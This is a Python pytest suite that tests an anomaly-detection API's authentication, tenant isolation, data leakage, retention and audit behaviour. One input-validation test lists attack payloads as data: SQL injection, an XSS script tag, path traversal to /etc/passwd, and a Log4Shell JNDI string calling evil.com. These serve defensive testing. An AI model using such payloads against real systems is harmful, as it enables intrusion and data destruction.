"""
Security and Compliance Testing

Comprehensive security tests covering authentication, authorization,
data privacy, and compliance requirements.
"""

import pytest
import asyncio
import time
import json
import hashlib
from typing import Dict, Any, List
import secrets

from .conftest import (
    assert_api_response_valid,
    E2ETestConfig
)


@pytest.mark.asyncio
@pytest.mark.security
class TestAuthentication:
    """Test authentication and authorization mechanisms."""

    async def test_api_key_authentication(
        self,
        async_client,
        api_headers
    ):
        """Test API key authentication functionality."""
        
        # Test valid API key
        response = await async_client.get(
            "/api/v1/health",
            headers=api_headers
        )
        assert_api_response_valid(response)
        
        # Test requests without API key
        response = await async_client.get("/api/v1/health")
        # Should either work (if health endpoint is public) or require auth
        assert response.status_code in [200, 401]
        
        # Test invalid API key
        invalid_headers = {
            "Authorization": "Bearer invalid-api-key-12345"
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json={"name": "test", "algorithm_name": "IsolationForest"},
            headers=invalid_headers
        )
        assert response.status_code == 401

    async def test_api_key_format_validation(
        self,
        async_client
    ):
        """Test API key format validation."""
        
        invalid_auth_headers = [
            {"Authorization": "invalid-format"},
            {"Authorization": "Bearer"},
            {"Authorization": "Basic dGVzdDp0ZXN0"},  # Wrong auth type
            {"Authorization": "Bearer "},  # Empty key
            {"Authorization": "Bearer " + "x" * 1000},  # Excessive length
        ]
        
        for headers in invalid_auth_headers:
            response = await async_client.post(
                "/api/v1/detectors",
                json={"name": "test", "algorithm_name": "IsolationForest"},
                headers=headers
            )
            assert response.status_code in [400, 401], f"Headers {headers} should be rejected"

    async def test_rate_limiting_authentication(
        self,
        async_client,
        api_headers
    ):
        """Test rate limiting with authentication."""
        
        # Make multiple rapid requests
        responses = []
        for i in range(20):
            response = await async_client.get(
                "/api/v1/health",
                headers=api_headers
            )
            responses.append(response.status_code)
            await asyncio.sleep(0.1)
        
        # Check if rate limiting is applied
        rate_limited = any(status == 429 for status in responses)
        successful = any(status == 200 for status in responses)
        
        # Should have some successful requests and potentially some rate limited
        assert successful, "No requests succeeded - authentication may be broken"


@pytest.mark.asyncio
@pytest.mark.security
class TestAuthorization:
    """Test authorization and access control."""

    async def test_resource_isolation(
        self,
        async_client,
        api_headers,
        sample_dataset
    ):
        """Test that resources are properly isolated between users/tenants."""
        
        # Create detector with user 1
        detector_config = {
            "name": "isolation-test-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        detector = response.json()
        detector_id = detector["id"]
        
        # Simulate different user with different API key
        # (In real implementation, this would be a different tenant)
        different_user_headers = {
            "Authorization": "Bearer different-user-api-key",
            "Content-Type": "application/json"
        }
        
        # Attempt to access detector with different user
        response = await async_client.get(
            f"/api/v1/detectors/{detector_id}",
            headers=different_user_headers
        )
        
        # Should either return 401 (unauthorized) or 404 (not found due to isolation)
        assert response.status_code in [401, 404], "Resource isolation may be compromised"
        
        # Cleanup with original user
        await async_client.delete(f"/api/v1/detectors/{detector_id}", headers=api_headers)

    async def test_operation_permissions(
        self,
        async_client,
        api_headers
    ):
        """Test that operations require appropriate permissions."""
        
        # Test creating detector (should require write permissions)
        detector_config = {
            "name": "permission-test-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        
        # Should succeed with proper permissions
        if response.status_code == 201:
            detector = response.json()
            detector_id = detector["id"]
            
            # Test read operation
            response = await async_client.get(
                f"/api/v1/detectors/{detector_id}",
                headers=api_headers
            )
            assert_api_response_valid(response)
            
            # Test update operation (should require write permissions)
            update_payload = {"description": "Updated description"}
            response = await async_client.put(
                f"/api/v1/detectors/{detector_id}",
                json=update_payload,
                headers=api_headers
            )
            # Should succeed or return appropriate error
            assert response.status_code in [200, 403]
            
            # Test delete operation (should require delete permissions)
            response = await async_client.delete(
                f"/api/v1/detectors/{detector_id}",
                headers=api_headers
            )
            assert response.status_code in [204, 403]
        
        elif response.status_code == 403:
            # Insufficient permissions - this is expected behavior
            pass
        else:
            pytest.fail(f"Unexpected status code: {response.status_code}")


@pytest.mark.asyncio
@pytest.mark.security
class TestDataPrivacy:
    """Test data privacy and protection mechanisms."""

    async def test_data_sanitization_in_responses(
        self,
        async_client,
        api_headers,
        sample_dataset
    ):
        """Test that sensitive data is not leaked in API responses."""
        
        # Create detector
        detector_config = {
            "name": "privacy-test-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05,
            "description": "Test detector for privacy validation"
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        detector = response.json()
        detector_id = detector["id"]
        
        # Check that sensitive information is not exposed
        sensitive_fields = [
            "password", "secret", "key", "token", "credential",
            "private", "internal", "debug"
        ]
        
        response_text = json.dumps(detector).lower()
        for field in sensitive_fields:
            assert field not in response_text, f"Potentially sensitive field '{field}' found in response"
        
        # Train detector with sample data
        training_data = sample_dataset['features'].iloc[:100]
        training_payload = {
            "detector_id": detector_id,
            "dataset": {
                "name": "privacy-test-data",
                "data": training_data.values.tolist(),
                "feature_names": training_data.columns.tolist()
            },
            "job_name": "privacy-test-training"
        }
        
        response = await async_client.post(
            "/api/v1/training/jobs",
            json=training_payload,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        training_job = response.json()
        
        # Check training job response for data leakage
        response_text = json.dumps(training_job).lower()
        
        # Should not contain raw training data in response
        for value in training_data.values.flatten()[:10]:  # Check first 10 values
            assert str(value) not in response_text, "Training data may be leaked in response"
        
        # Cleanup
        await async_client.delete(f"/api/v1/detectors/{detector_id}", headers=api_headers)

    async def test_data_persistence_security(
        self,
        async_client,
        api_headers,
        sample_dataset
    ):
        """Test that data is securely handled in persistence layer."""
        
        # Create detector
        detector_config = {
            "name": "persistence-security-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        detector = response.json()
        detector_id = detector["id"]
        
        # Include some synthetic "sensitive" data
        training_data = sample_dataset['features'].iloc[:50].copy()
        
        # Add a column that looks like sensitive data
        training_data['synthetic_ssn'] = [f"123-45-{i:04d}" for i in range(len(training_data))]
        
        training_payload = {
            "detector_id": detector_id,
            "dataset": {
                "name": "security-test-data",
                "data": training_data.values.tolist(),
                "feature_names": training_data.columns.tolist()
            },
            "job_name": "security-test-training"
        }
        
        response = await async_client.post(
            "/api/v1/training/jobs",
            json=training_payload,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        training_job = response.json()
        job_id = training_job["job_id"]
        
        # Wait for training completion
        await self._wait_for_job_completion(async_client, job_id, api_headers)
        
        # Get job details
        response = await async_client.get(
            f"/api/v1/training/jobs/{job_id}",
            headers=api_headers
        )
        assert_api_response_valid(response)
        job_details = response.json()
        
        # Check that logs don't contain sensitive data
        logs = job_details.get("logs", [])
        for log_entry in logs:
            assert "123-45-" not in str(log_entry), "Sensitive data found in logs"
        
        # Cleanup
        await async_client.delete(f"/api/v1/detectors/{detector_id}", headers=api_headers)

    async def test_input_validation_security(
        self,
        async_client,
        api_headers
    ):
        """Test input validation against common security attacks."""
        
        # Test SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE detectors; --",
            "' OR '1'='1",
            "1; DELETE FROM users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/}",
            "../../../windows/system32/drivers/etc/hosts"
        ]
        
        for malicious_input in malicious_inputs:
            detector_config = {
                "name": malicious_input,
                "algorithm_name": "IsolationForest",
                "contamination_rate": 0.05
            }
            
            response = await async_client.post(
                "/api/v1/detectors",
                json=detector_config,
                headers=api_headers
            )
            
            # Should either reject the input or sanitize it
            if response.status_code == 201:
                detector = response.json()
                # Check that the malicious input was sanitized
                assert detector["name"] != malicious_input, f"Malicious input '{malicious_input}' was not sanitized"
                
                # Cleanup
                await async_client.delete(f"/api/v1/detectors/{detector['id']}", headers=api_headers)
            else:
                # Input was rejected - this is good
                assert response.status_code in [400, 422], f"Unexpected status for malicious input: {response.status_code}"

    async def _wait_for_job_completion(
        self,
        client,
        job_id: str,
        headers: Dict[str, str],
        max_wait_time: int = 60
    ):
        """Helper method to wait for training job completion."""
        start_time = time.time()
        
        while time.time() - start_time < max_wait_time:
            response = await client.get(
                f"/api/v1/training/jobs/{job_id}",
                headers=headers
            )
            assert_api_response_valid(response)
            job_status = response.json()
            
            if job_status["status"] in ["completed", "failed"]:
                return job_status
                
            await asyncio.sleep(2)
        
        pytest.fail("Training did not complete within expected time")


@pytest.mark.asyncio
@pytest.mark.compliance
class TestComplianceRequirements:
    """Test compliance with various regulatory requirements."""

    async def test_data_retention_policies(
        self,
        async_client,
        api_headers,
        sample_dataset
    ):
        """Test data retention and deletion policies."""
        
        # Create detector and train it
        detector_config = {
            "name": "retention-test-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        detector = response.json()
        detector_id = detector["id"]
        
        # Train with data
        training_data = sample_dataset['features'].iloc[:100]
        training_payload = {
            "detector_id": detector_id,
            "dataset": {
                "name": "retention-test-data",
                "data": training_data.values.tolist(),
                "feature_names": training_data.columns.tolist()
            },
            "job_name": "retention-test-training"
        }
        
        response = await async_client.post(
            "/api/v1/training/jobs",
            json=training_payload,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        training_job = response.json()
        job_id = training_job["job_id"]
        
        # Wait for completion
        await self._wait_for_job_completion(async_client, job_id, api_headers)
        
        # Verify data exists
        response = await async_client.get(
            f"/api/v1/training/jobs/{job_id}",
            headers=api_headers
        )
        assert_api_response_valid(response)
        
        # Test deletion (simulating data retention policy)
        response = await async_client.delete(
            f"/api/v1/detectors/{detector_id}",
            headers=api_headers
        )
        assert_api_response_valid(response, 204)
        
        # Verify data is actually deleted
        response = await async_client.get(
            f"/api/v1/detectors/{detector_id}",
            headers=api_headers
        )
        assert response.status_code == 404, "Detector data should be deleted"
        
        # Training job should also be cleaned up or marked as deleted
        response = await async_client.get(
            f"/api/v1/training/jobs/{job_id}",
            headers=api_headers
        )
        # Should either be deleted (404) or marked as associated with deleted detector
        assert response.status_code in [404, 200]

    async def test_audit_logging(
        self,
        async_client,
        api_headers,
        sample_dataset
    ):
        """Test audit logging for compliance tracking."""
        
        # Create detector (should be logged)
        detector_config = {
            "name": "audit-test-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        detector = response.json()
        detector_id = detector["id"]
        
        # Perform various operations that should be audited
        operations = [
            # Read operation
            ("GET", f"/api/v1/detectors/{detector_id}", None),
            # Update operation
            ("PUT", f"/api/v1/detectors/{detector_id}", {"description": "Updated for audit test"}),
        ]
        
        for method, url, payload in operations:
            if method == "GET":
                response = await async_client.get(url, headers=api_headers)
            elif method == "PUT":
                response = await async_client.put(url, json=payload, headers=api_headers)
            
            # Operation should succeed or fail gracefully
            assert response.status_code in [200, 204, 403, 404]
        
        # Test training operation (high-value operation that should be audited)
        training_data = sample_dataset['features'].iloc[:50]
        training_payload = {
            "detector_id": detector_id,
            "dataset": {
                "name": "audit-test-data",
                "data": training_data.values.tolist(),
                "feature_names": training_data.columns.tolist()
            },
            "job_name": "audit-test-training"
        }
        
        response = await async_client.post(
            "/api/v1/training/jobs",
            json=training_payload,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        
        # Delete operation (should be audited)
        response = await async_client.delete(
            f"/api/v1/detectors/{detector_id}",
            headers=api_headers
        )
        assert_api_response_valid(response, 204)
        
        # Note: In a real implementation, you would check audit logs here
        # For this test, we verify that operations complete successfully
        # and trust that proper audit logging is implemented

    async def test_data_minimization(
        self,
        async_client,
        api_headers,
        sample_dataset
    ):
        """Test data minimization principles."""
        
        # Create detector
        detector_config = {
            "name": "minimization-test-detector",
            "algorithm_name": "IsolationForest",
            "contamination_rate": 0.05
        }
        
        response = await async_client.post(
            "/api/v1/detectors",
            json=detector_config,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        detector = response.json()
        detector_id = detector["id"]
        
        # Check that response contains only necessary information
        necessary_fields = {"id", "name", "algorithm_name", "contamination_rate", "created_at"}
        response_fields = set(detector.keys())
        
        # Should not contain excessive metadata
        excessive_fields = response_fields - necessary_fields - {
            "description", "hyperparameters", "tags", "is_fitted", "updated_at"
        }
        
        assert len(excessive_fields) <= 3, f"Response contains excessive fields: {excessive_fields}"
        
        # Train detector with minimal data
        training_data = sample_dataset['features'].iloc[:30]  # Minimal dataset
        training_payload = {
            "detector_id": detector_id,
            "dataset": {
                "name": "minimal-test-data",
                "data": training_data.values.tolist(),
                "feature_names": training_data.columns.tolist()
            },
            "job_name": "minimal-test-training"
        }
        
        response = await async_client.post(
            "/api/v1/training/jobs",
            json=training_payload,
            headers=api_headers
        )
        assert_api_response_valid(response, 201)
        training_job = response.json()
        
        # Check that training job response is minimal
        job_necessary_fields = {
            "job_id", "name", "status", "detector_config", 
            "dataset_name", "created_at"
        }
        job_response_fields = set(training_job.keys())
        
        excessive_job_fields = job_response_fields - job_necessary_fields - {
            "started_at", "completed_at", "metrics", "model_path", 
            "logs", "error_message", "execution_time"
        }
        
        assert len(excessive_job_fields) <= 2, f"Training job response contains excessive fields: {excessive_job_fields}"
        
        # Cleanup
        await async_client.delete(f"/api/v1/detectors/{detector_id}", headers=api_headers)

    async def _wait_for_job_completion(
        self,
        client,
        job_id: str,
        headers: Dict[str, str],
        max_wait_time: int = 60
    ):
        """Helper method to wait for training job completion."""
        start_time = time.time()
        
        while time.time() - start_time < max_wait_time:
            response = await client.get(
                f"/api/v1/training/jobs/{job_id}",
                headers=headers
            )
            assert_api_response_valid(response)
            job_status = response.json()
            
            if job_status["status"] in ["completed", "failed"]:
                return job_status
                
            await asyncio.sleep(2)
        
        pytest.fail("Training did not complete within expected time")